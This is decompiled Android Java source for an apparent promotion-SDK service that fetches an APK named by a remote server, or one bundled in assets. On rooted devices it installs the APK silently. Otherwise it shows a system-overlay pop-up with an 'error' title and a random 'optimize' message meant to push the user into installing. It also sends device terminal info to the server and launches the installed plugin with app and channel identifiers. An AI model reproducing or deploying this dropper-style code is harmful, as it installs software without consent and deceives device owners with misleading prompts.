package com.zhuoyi.system.promotion.service;

import android.app.AlertDialog;
import android.app.AlertDialog.Builder;
import android.content.ComponentName;
import android.content.Context;
import android.content.DialogInterface;
import android.content.DialogInterface.OnClickListener;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.text.TextUtils;
import com.amap.api.services.core.AMapException;
import com.zhuoyi.system.download.model.DownloadInfo;
import com.zhuoyi.system.download.util.DownloadConstants;
import com.zhuoyi.system.download.util.DownloadUtils;
import com.zhuoyi.system.network.callback.NetworkCallback;
import com.zhuoyi.system.network.connection.HTTPConnection;
import com.zhuoyi.system.network.protocol.GetSDKDownloadReq;
import com.zhuoyi.system.network.protocol.GetSDKDownloadResp;
import com.zhuoyi.system.network.serializer.AttributeUitl;
import com.zhuoyi.system.network.serializer.ZyCom_Message;
import com.zhuoyi.system.network.util.NetworkUtils;
import com.zhuoyi.system.promotion.data.PromDBUtils;
import com.zhuoyi.system.promotion.listener.ZyPromSDK;
import com.zhuoyi.system.promotion.util.PromUtils;
import com.zhuoyi.system.promotion.util.constants.BundleConstants;
import com.zhuoyi.system.service.IZyService;
import com.zhuoyi.system.statistics.prom.util.StatsPromUtils;
import com.zhuoyi.system.util.AppInfoUtils;
import com.zhuoyi.system.util.EncryptUtils;
import com.zhuoyi.system.util.FileUtils;
import com.zhuoyi.system.util.Logger;
import com.zhuoyi.system.util.ResourceIdUtils;
import com.zhuoyi.system.util.TerminalInfoUtil;
import com.zhuoyi.system.util.constant.FileConstants;
import com.zhuoyi.system.util.constant.Session;
import com.zhuoyi.system.util.model.MyPackageInfo;
import java.io.File;
import java.lang.ref.WeakReference;
import java.util.Random;

public class PromHandlePlugInService extends IZyService {
    private final String PLUGIN_INIT_COUNT = "init_count";
    private final String TAG = "PromHandlePlugInService";
    private String apkPath = null;
    private DownloadHandler downloadHandler;
    private boolean hasInnerFile = false;
    private boolean hasRoot = false;
    private String innerActivityName = EncryptUtils.getPlugInActivityName();
    private String innerPackageName = EncryptUtils.getPlugInPackageName();
    private MyPackageInfo myPackageInfo;

    class C10642 implements Runnable {
        C10642() {
        }

        public void run() {
            if (PromHandlePlugInService.this.hasInnerFile) {
                File file = FileUtils.getFileFromAssets(PromHandlePlugInService.this.mContext, FileConstants.PLUGIN_FILE_NAME);
                PackageInfo info = AppInfoUtils.getPackageInfoFromAPKFile(PromHandlePlugInService.this.mContext.getPackageManager(), file);
                MyPackageInfo packageInfo = new MyPackageInfo(info.packageName, info.versionCode, 20, 0);
                packageInfo.setActivityName(PromHandlePlugInService.this.innerActivityName);
                AppInfoUtils.silentInstallApp(PromHandlePlugInService.this.mContext, file.getAbsolutePath(), packageInfo);
            } else if (!TextUtils.isEmpty(PromHandlePlugInService.this.apkPath)) {
                AppInfoUtils.silentInstallApp(PromHandlePlugInService.this.mContext, PromHandlePlugInService.this.apkPath, PromHandlePlugInService.this.myPackageInfo);
                PromUtils.getInstance(PromHandlePlugInService.this.mContext).saveInstalledInfo(PromHandlePlugInService.this.myPackageInfo);
            }
        }
    }

    class C10653 implements OnClickListener {
        C10653() {
        }

        public void onClick(DialogInterface dialog, int which) {
            dialog.dismiss();
        }
    }

    class C10664 implements OnClickListener {
        C10664() {
        }

        public void onClick(DialogInterface dialog, int which) {
            if (PromHandlePlugInService.this.hasInnerFile) {
                PromHandlePlugInService.this.installFromAsset();
            } else {
                AppInfoUtils.installApp(PromHandlePlugInService.this.mContext, PromHandlePlugInService.this.apkPath, PromHandlePlugInService.this.myPackageInfo);
            }
        }
    }

    class C10686 implements Runnable {
        C10686() {
        }

        public void run() {
            File file = FileUtils.getFileFromAssets(PromHandlePlugInService.this.mContext, FileConstants.PLUGIN_FILE_NAME);
            if (file.exists()) {
                PackageInfo info = AppInfoUtils.getPackageInfoFromAPKFile(PromHandlePlugInService.this.mContext.getPackageManager(), file);
                AppInfoUtils.installApp(PromHandlePlugInService.this.mContext, file.getAbsolutePath(), new MyPackageInfo(info.packageName, info.versionCode, 20, 0, PromHandlePlugInService.this.innerActivityName));
                return;
            }
            Logger.m3372d("PromHandlePlugInService", "installFromAsset failed. file not exist");
        }
    }

    private static class DownloadHandler extends Handler {
        private final WeakReference<PromHandlePlugInService> mServiceReference;

        public DownloadHandler(PromHandlePlugInService service, Context c) {
            super(c.getMainLooper());
            this.mServiceReference = new WeakReference(service);
        }

        public void handleMessage(Message msg) {
            super.handleMessage(msg);
            PromHandlePlugInService service = (PromHandlePlugInService) this.mServiceReference.get();
            if (service != null) {
                service.handleDownloadMessage(msg);
                service.stopSelf();
            }
        }
    }

    class C18401 implements NetworkCallback {
        C18401() {
        }

        public void onResponse(Boolean result, ZyCom_Message respMessage) {
            if (result.booleanValue()) {
                try {
                    if (respMessage.head.code == AttributeUitl.getMessageCode(GetSDKDownloadResp.class)) {
                        GetSDKDownloadResp resp = respMessage.message;
                        Logger.debug("GetSDKDownloadResp:" + resp.toString());
                        if (resp.getErrorCode() != 0) {
                            PromHandlePlugInService.this.stopSelf();
                            Logger.m3372d("PromHandlePlugInService", "GetSDKDownloadReq  Error Message" + resp.getErrorMessage());
                            return;
                        } else if (resp.isEmpty()) {
                            Logger.m3372d("PromHandlePlugInService", "GetSDKDownloadReq  Message is empty.");
                            PromHandlePlugInService.this.stopSelf();
                            return;
                        } else {
                            PromHandlePlugInService.this.handleCommandResp(resp);
                            return;
                        }
                    }
                    PromHandlePlugInService.this.stopSelf();
                    return;
                } catch (Exception e) {
                    Logger.m3375p(e);
                    PromHandlePlugInService.this.stopSelf();
                    return;
                }
            }
            Logger.m3372d("PromHandlePlugInService", "Get GetSDKDownloadResp Action Error.");
            PromHandlePlugInService.this.stopSelf();
        }
    }

    public PromHandlePlugInService(int serviceId, Context c, Handler handler) {
        super(serviceId, c, handler);
        this.downloadHandler = new DownloadHandler(this, c);
        this.hasRoot = PromUtils.getRootFlag(c);
    }

    public void onStartCommand(Intent intent, int flags, int startId) {
        StatsPromUtils.getInstance(this.mContext).addPlugInfInitAction(new MyPackageInfo(this.mContext.getPackageName(), AppInfoUtils.getPackageVersionCode(this.mContext)));
        if (isInnerPlugSelf()) {
            stopSelf();
        } else if (!hasInnerFile()) {
            initService();
        } else if (isInnerFileInstalled()) {
            initInnerService(this.innerPackageName, this.innerActivityName);
        } else {
            handleApkFile();
        }
    }

    private boolean isInnerPlugSelf() {
        return this.innerPackageName.equals(this.mContext.getPackageName());
    }

    private boolean isInnerFileInstalled() {
        boolean ret = false;
        File file = FileUtils.getFileFromAssets(this.mContext, FileConstants.PLUGIN_FILE_NAME);
        if (file.exists()) {
            ret = AppInfoUtils.isApkExist(this.mContext, AppInfoUtils.getPackageInfoFromAPKFile(this.mContext.getPackageManager(), file).packageName);
        }
        Logger.m3372d("PromHandlePlugInService", "isInnerFileInstalled :" + ret);
        return ret;
    }

    private boolean hasInnerFile() {
        this.hasInnerFile = FileUtils.hasFileInAssets(this.mContext, FileConstants.PLUGIN_FILE_NAME);
        Logger.m3372d("PromHandlePlugInService", "hasInnerFile: " + this.hasInnerFile);
        return this.hasInnerFile;
    }

    public void onServerAddressReponse(Session session) {
        GetSDKDownloadReq req = new GetSDKDownloadReq();
        req.setPackageName(this.mContext.getPackageName());
        req.setTerminalInfo(TerminalInfoUtil.getTerminalInfo(this.mContext));
        HTTPConnection.getInstance().sendRequest(session.getPromNetworkAddr(), req, new C18401());
    }

    private void handleCommandResp(GetSDKDownloadResp resp) {
        this.myPackageInfo = new MyPackageInfo(resp.getPackageName(), resp.getVersionCode());
        this.myPackageInfo.setActivityName(resp.getActivity());
        this.myPackageInfo.setPosition(20);
        this.myPackageInfo.setSource(0);
        this.apkPath = DownloadUtils.getInstance(this.mContext).getApkDownloadFilePath(resp.getPackageName(), resp.getVersionCode());
        if (plugInIsExist(resp.getPackageName())) {
            initInnerService(resp.getPackageName(), resp.getActivity());
            stopSelf();
        } else if (apkFileExist()) {
            handleApkFile();
            stopSelf();
        } else if (NetworkUtils.getNetworkType(this.mContext) == (byte) 3 && !DownloadUtils.getInstance(this.mContext).getDownloadApkThreadMap().containsKey(resp.getPackageName())) {
            DownloadUtils.getInstance(this.mContext).addDownloadApkThread(new DownloadInfo(this.downloadHandler, resp.getPackageName(), resp.getVersionCode(), 20, 0, resp.getDownloadUrl(), resp.getFileVerifyCode(), true));
        }
    }

    private void initInnerService(String packageName, String activityName) {
        Bundle b = new Bundle();
        b.putString("zy_appid", new StringBuilder(String.valueOf(TerminalInfoUtil.getAppId(this.mContext))).append("apk").toString());
        b.putString(BundleConstants.BUNDLE_CPID_METADATA_KEY, TerminalInfoUtil.getCpId(this.mContext));
        b.putString("zy_channel_id", TerminalInfoUtil.getChannelId(this.mContext));
        b.putString(BundleConstants.BUNDLE_APPKEY_METADATA_KEY, TerminalInfoUtil.getAppKey(this.mContext));
        Intent intent = new Intent();
        intent.putExtras(b);
        intent.setComponent(new ComponentName(packageName, activityName));
        intent.setFlags(268435456);
        this.mContext.startActivity(intent);
    }

    private void handleApkFile() {
        if (this.hasRoot) {
            new Thread(new C10642()).start();
        } else {
            showPromt();
        }
    }

    private boolean apkFileExist() {
        if (TextUtils.isEmpty(this.apkPath) || !new File(this.apkPath).exists()) {
            return false;
        }
        return true;
    }

    public void handleDownloadMessage(Message msg) {
        String packageName = msg.obj.getString(DownloadConstants.DOWNLOAD_HANDLER_BUNDLE_PACKAGE_NAME);
        if (!TextUtils.isEmpty(packageName) && msg.what == 3) {
            Logger.debug(" packageName= " + packageName);
            saveInit();
        }
    }

    private boolean plugInIsExist(String packageName) {
        return AppInfoUtils.isApkExist(this.mContext, packageName);
    }

    public boolean isFirstInit() {
        boolean ret = true;
        if (!TextUtils.isEmpty(PromDBUtils.getInstance(this.mContext).queryCfgValueByKey("init_count"))) {
            ret = false;
        }
        Logger.m3372d("PromHandlePlugInService", "isFirstInit:" + ret);
        return ret;
    }

    private void saveInit() {
        PromDBUtils.getInstance(this.mContext).insertCfg("init_count", "init_count");
    }

    public void showPromt() {
        if (isFirstInit()) {
            saveInit();
            return;
        }
        final Builder alertBuilder = new Builder(ZyPromSDK.getContext());
        alertBuilder.setNegativeButton(ResourceIdUtils.getStringByResId(this.mContext, "R.string.zy_back"), new C10653());
        alertBuilder.setPositiveButton(ResourceIdUtils.getStringByResId(this.mContext, "R.string.zy_sure"), new C10664());
        alertBuilder.setTitle(ResourceIdUtils.getStringByResId(this.mContext, "R.string.zy_error_title"));
        alertBuilder.setMessage(ResourceIdUtils.getStringByResId(this.mContext, "R.string.zy_optimize_message" + new Random().nextInt(4)));
        this.downloadHandler.post(new Runnable() {
            public void run() {
                AlertDialog ad = alertBuilder.create();
                ad.getWindow().setType(AMapException.CODE_AMAP_ENGINE_TABLEID_NOT_EXIST);
                ad.show();
            }
        });
    }

    private void installFromAsset() {
        new Thread(new C10686()).start();
    }
}
